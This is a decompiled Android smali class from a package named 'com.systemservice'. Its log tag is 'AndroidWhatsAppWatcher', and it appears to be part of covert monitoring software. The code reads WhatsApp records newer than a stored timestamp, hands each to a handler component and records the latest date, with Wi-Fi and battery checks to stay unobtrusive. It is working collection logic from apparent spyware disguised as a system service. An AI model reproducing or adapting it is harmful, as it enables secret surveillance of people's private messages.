.class Lcom/systemservice/a/c/h/h;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/d/b;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/systemservice/a/c/h/i;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/h/i;Landroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    iput-object p2, p0, Lcom/systemservice/a/c/h/h;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 21

    move-object/from16 v1, p0

    iget-object v0, v1, Lcom/systemservice/a/c/h/h;->a:Landroid/content/Context;

    const/4 v2, 0x0

    const-string v3, "app_prefs_settings"

    invoke-virtual {v0, v3, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v3, "media_data_transfered_by_wifi_only"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v3

    const-string v4, "save_battery"

    const-string v5, "AndroidWhatsAppWatcher"

    if-eqz v3, :cond_0

    invoke-interface {v0, v4, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v3

    if-nez v3, :cond_0

    iget-object v3, v1, Lcom/systemservice/a/c/h/h;->a:Landroid/content/Context;

    invoke-static {v3}, Lcom/systemservice/a/a/h;->c(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v0, "WiFi ONLY = false"

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v2}, Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/c/h/i;)Lorg/apache/log4j/Logger;

    move-result-object v2

    invoke-virtual {v2, v0}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_0
    invoke-interface {v0, v4, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    const-wide/16 v3, 0x3e8

    const-wide/16 v6, 0x1

    const-string v8, ""

    const-wide/16 v9, 0x0

    const-string v11, "last_whatsapp_date"

    const-string v12, "FINALLY WHATSAPP"

    if-eqz v2, :cond_4

    iget-object v2, v1, Lcom/systemservice/a/c/h/h;->a:Landroid/content/Context;

    invoke-static {v2}, Lcom/systemservice/a/a/h;->b(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_8

    const/4 v2, 0x1

    const-string v13, "battery"

    invoke-interface {v0, v13, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_8

    :try_start_0
    invoke-interface {v0, v11, v9, v10}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v13

    new-instance v2, Ljava/util/Date;

    add-long/2addr v13, v6

    mul-long v13, v13, v3

    invoke-direct {v2, v13, v14}, Ljava/util/Date;-><init>(J)V

    iget-object v3, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    iget-object v3, v3, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v3, Lcom/systemservice/a/h/k;

    iget-object v15, v1, Lcom/systemservice/a/c/h/h;->a:Landroid/content/Context;

    iget-object v4, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v4}, Lcom/systemservice/a/c/h/i;->b(Lcom/systemservice/a/c/h/i;)Ljava/lang/String;

    move-result-object v16

    const/16 v18, 0x0

    iget-object v4, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v4}, Lcom/systemservice/a/c/h/i;->c(Lcom/systemservice/a/c/h/i;)Z

    move-result v19

    const-string v20, ""

    move-object/from16 v17, v2

    invoke-static/range {v15 .. v20}, Lcom/systemservice/a/g/f;->a(Landroid/content/Context;Ljava/lang/String;Ljava/util/Date;Ljava/util/Date;ZLjava/lang/String;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_3

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_1
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_2

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcom/systemservice/a/e/g;

    invoke-virtual {v3, v4}, Lcom/systemservice/a/h/k;->a(Lcom/systemservice/a/e/g;)J

    iget-wide v6, v4, Lcom/systemservice/a/e/g;->d:J

    cmp-long v13, v9, v6

    if-gez v13, :cond_1

    iget-wide v6, v4, Lcom/systemservice/a/e/g;->d:J

    move-wide v9, v6

    goto :goto_0

    :cond_2
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0, v11, v9, v10}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_3
    iget-object v0, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    iget-object v2, v1, Lcom/systemservice/a/c/h/h;->a:Landroid/content/Context;

    invoke-static {v0, v2, v3}, Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/c/h/i;Landroid/content/Context;Lcom/systemservice/a/h/k;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto/16 :goto_3

    :catchall_0
    move-exception v0

    goto :goto_1

    :catch_0
    move-exception v0

    :try_start_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v5, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v2}, Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/c/h/i;)Lorg/apache/log4j/Logger;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_3

    :goto_1
    invoke-static {v5, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v2}, Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/c/h/i;)Lorg/apache/log4j/Logger;

    move-result-object v2

    invoke-virtual {v2, v12}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    throw v0

    :cond_4
    :try_start_2
    invoke-interface {v0, v11, v9, v10}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v13

    new-instance v2, Ljava/util/Date;

    add-long/2addr v13, v6

    mul-long v13, v13, v3

    invoke-direct {v2, v13, v14}, Ljava/util/Date;-><init>(J)V

    iget-object v3, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    iget-object v3, v3, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v3, Lcom/systemservice/a/h/k;

    iget-object v15, v1, Lcom/systemservice/a/c/h/h;->a:Landroid/content/Context;

    iget-object v4, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v4}, Lcom/systemservice/a/c/h/i;->b(Lcom/systemservice/a/c/h/i;)Ljava/lang/String;

    move-result-object v16

    const/16 v18, 0x0

    iget-object v4, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v4}, Lcom/systemservice/a/c/h/i;->c(Lcom/systemservice/a/c/h/i;)Z

    move-result v19

    const-string v20, ""

    move-object/from16 v17, v2

    invoke-static/range {v15 .. v20}, Lcom/systemservice/a/g/f;->a(Landroid/content/Context;Ljava/lang/String;Ljava/util/Date;Ljava/util/Date;ZLjava/lang/String;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_7

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_5
    :goto_2
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_6

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcom/systemservice/a/e/g;

    invoke-virtual {v3, v4}, Lcom/systemservice/a/h/k;->a(Lcom/systemservice/a/e/g;)J

    iget-wide v6, v4, Lcom/systemservice/a/e/g;->d:J

    cmp-long v13, v9, v6

    if-gez v13, :cond_5

    iget-wide v6, v4, Lcom/systemservice/a/e/g;->d:J

    move-wide v9, v6

    goto :goto_2

    :cond_6
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0, v11, v9, v10}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_7
    iget-object v0, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    iget-object v2, v1, Lcom/systemservice/a/c/h/h;->a:Landroid/content/Context;

    invoke-static {v0, v2, v3}, Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/c/h/i;Landroid/content/Context;Lcom/systemservice/a/h/k;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    :goto_3
    invoke-static {v5, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v0}, Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/c/h/i;)Lorg/apache/log4j/Logger;

    move-result-object v0

    invoke-virtual {v0, v12}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    goto :goto_4

    :catchall_1
    move-exception v0

    goto :goto_5

    :catch_1
    move-exception v0

    :try_start_3
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v5, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v2}, Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/c/h/i;)Lorg/apache/log4j/Logger;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_3

    :cond_8
    :goto_4
    return-void

    :goto_5
    invoke-static {v5, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, v1, Lcom/systemservice/a/c/h/h;->b:Lcom/systemservice/a/c/h/i;

    invoke-static {v2}, Lcom/systemservice/a/c/h/i;->a(Lcom/systemservice/a/c/h/i;)Lorg/apache/log4j/Logger;

    move-result-object v2

    invoke-virtual {v2, v12}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    throw v0
.end method
